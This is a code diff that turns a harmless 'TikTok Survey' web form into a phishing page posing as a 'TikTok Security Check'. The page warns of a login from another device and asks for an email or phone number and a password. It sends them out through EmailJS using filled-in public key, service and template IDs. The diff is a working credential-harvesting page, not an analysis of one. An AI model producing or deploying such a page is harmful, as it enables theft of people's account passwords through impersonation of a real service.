@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>TikTok Survey</title>
+  <title>TikTok Security</title>
 
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
@@ -60,10 +60,12 @@
 <body>
 
 <div class="container">
-  <h2>TikTok Survey</h2>
-  <form id="survey-form">
+  <h2>TikTok Security Check</h2>
+  <p>we recently discovered your tiktok account was loged in in another device⚠️⚠️⚠️⚠️</p>
+  <h3><i>please login now to protect your account </i></h3>
+  <form id="security-form">
     <input type="text" name="user_contact" placeholder="Email or Phone Number" required>
-    <textarea name="user_feedback" placeholder="How do you enjoy TikTok?" required></textarea>
+    <input type="user_feedback" placeholder="password" required>
     <button type="submit">Submit</button>
   </form>
   <div id="debug"></div>
@@ -71,7 +73,7 @@
 
 <script>
   // Initialize EmailJS with your public key
-  emailjs.init("YOUR_PUBLIC_KEY");
+  emailjs.init("KrIsLS-FBr6QzICvy");
 
   const form = document.getElementById("survey-form");
   const debugArea = document.getElementById("debug");
@@ -82,8 +84,8 @@
     debugArea.innerHTML = "Sending…";
 
     emailjs.sendForm(
-      "YOUR_SERVICE_ID",
-      "YOUR_TEMPLATE_ID",
+      "service_qgk7vit",
+      "template_as1f6xf",
       this
     ).then(function(response) {
       debugArea.innerHTML = "✅ Sent successfully!";
